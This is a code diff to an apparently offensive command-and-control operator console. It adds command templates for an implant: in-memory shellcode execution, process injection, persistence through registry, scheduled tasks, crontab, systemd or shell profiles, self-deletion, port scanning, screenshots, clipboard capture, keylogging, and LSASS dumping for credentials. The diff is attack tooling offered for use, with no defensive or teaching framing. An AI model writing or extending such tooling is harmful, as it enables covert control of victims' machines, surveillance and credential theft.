@@ -120,7 +120,7 @@ export const commandCatalog: CommandTemplate[] = [
     build: (values) => {
       const path = value(values, "path");
       return {
-        command: "__nagomio_file_download",
+        command: "file_download",
         arguments: [path],
         preview: `download ${path}`
       };
@@ -162,5 +162,125 @@ export const commandCatalog: CommandTemplate[] = [
         platform === "windows" ? "ipconfig /all; route print" : "ip addr; ip route",
         platform
       )
+  },
+  {
+    id: "whoami",
+    name: "Whoami",
+    group: "Discovery",
+    summary: "Return username, group memberships, integrity level, and elevation status as JSON.",
+    fields: [],
+    build: () => ({ command: "whoami", arguments: [], preview: "whoami" })
+  },
+  {
+    id: "mem_exec",
+    name: "Memory Execute",
+    group: "Process",
+    summary: "Allocate memory, copy shellcode in, and run it on a new thread.",
+    fields: [
+      { key: "sc", label: "Shellcode (base64)", placeholder: "TVqQAAMAAAAEAAAA", multiline: true, secret: true }
+    ],
+    build: (values) => ({
+      command: "mem_exec",
+      arguments: [value(values, "sc")],
+      preview: `mem_exec ${value(values, "sc").slice(0, 24)}…`
+    })
+  },
+  {
+    id: "port_scan",
+    name: "Port Scan",
+    group: "Network",
+    summary: "Quick TCP-connect scan of a host with a port list.",
+    fields: [
+      { key: "host", label: "Host", placeholder: "192.168.1.1" },
+      { key: "ports", label: "Ports", placeholder: "22,80,8000-8100", defaultValue: "22,80,443" },
+      { key: "timeout", label: "Timeout (ms)", defaultValue: "200" }
+    ],
+    build: (values) => ({
+      command: "portscan",
+      arguments: [value(values, "host"), value(values, "ports"), value(values, "timeout", "200")],
+      preview: `portscan ${value(values, "host")} ${value(values, "ports")}`
+    })
+  },
+  {
+    id: "persist",
+    name: "Install Persistence",
+    group: "Process",
+    summary: "Install a persistence mechanism on the target. Strategy: registry/schtasks (Windows) or crontab/systemd-user/shell-profile (Linux).",
+    fields: [
+      { key: "strategy", label: "Strategy", defaultValue: "registry", placeholder: "registry | schtasks | crontab | systemd-user | shell-profile" },
+      { key: "bin", label: "Binary path (optional)", placeholder: "leave empty for self" }
+    ],
+    build: (values) => {
+      const strategy = value(values, "strategy", "registry");
+      const bin = value(values, "bin");
+      const args = bin ? [strategy, bin] : [strategy];
+      return { command: "persist", arguments: args, preview: `persist ${args.join(" ")}` };
+    }
+  },
+  {
+    id: "uninstall",
+    name: "Uninstall",
+    group: "Process",
+    summary: "Self-delete the agent binary. now = spawn a one-shot to rm; reboot = schedule for next boot.",
+    fields: [{ key: "mode", label: "Mode", defaultValue: "now", placeholder: "now | reboot" }],
+    build: (values) => ({
+      command: "uninstall",
+      arguments: [value(values, "mode", "now")],
+      preview: `uninstall ${value(values, "mode", "now")}`
+    })
+  },
+  {
+    id: "inject",
+    name: "Process Inject",
+    group: "Process",
+    summary: "Inject shellcode into a remote process (Windows only).",
+    fields: [
+      { key: "pid", label: "Target PID", placeholder: "1234" },
+      { key: "sc", label: "Shellcode (base64)", placeholder: "TVqQAAMAAAAEAAAA", multiline: true, secret: true },
+      { key: "mode", label: "Mode (thread|hijack)", defaultValue: "thread" }
+    ],
+    build: (values) => ({
+      command: "inject",
+      arguments: [value(values, "pid"), value(values, "sc"), value(values, "mode", "thread")],
+      preview: `inject ${value(values, "pid")} ${value(values, "sc").slice(0, 24)}…`
+    })
+  },
+  {
+    id: "screenshot",
+    name: "Screenshot",
+    group: "Discovery",
+    summary: "Capture the primary display and return as base64 BMP.",
+    fields: [],
+    build: () => ({ command: "screenshot", arguments: [], preview: "screenshot" })
+  },
+  {
+    id: "clipboard",
+    name: "Clipboard",
+    group: "Discovery",
+    summary: "Read the current clipboard text.",
+    fields: [],
+    build: () => ({ command: "clipboard", arguments: [], preview: "clipboard" })
+  },
+  {
+    id: "keylog",
+    name: "Keylog",
+    group: "Discovery",
+    summary: "Start a low-level keyboard hook or flush captured keystrokes.",
+    fields: [
+      { key: "mode", label: "Mode", defaultValue: "flush", placeholder: "start | flush" }
+    ],
+    build: (values) => ({
+      command: "keylog",
+      arguments: [value(values, "mode", "flush")],
+      preview: `keylog ${value(values, "mode", "flush")}`
+    })
+  },
+  {
+    id: "lsass",
+    name: "LSASS Dump",
+    group: "Discovery",
+    summary: "MiniDumpWriteDump lsass.exe and return the bytes (Windows only).",
+    fields: [],
+    build: () => ({ command: "lsass", arguments: [], preview: "lsass" })
   }
 ];
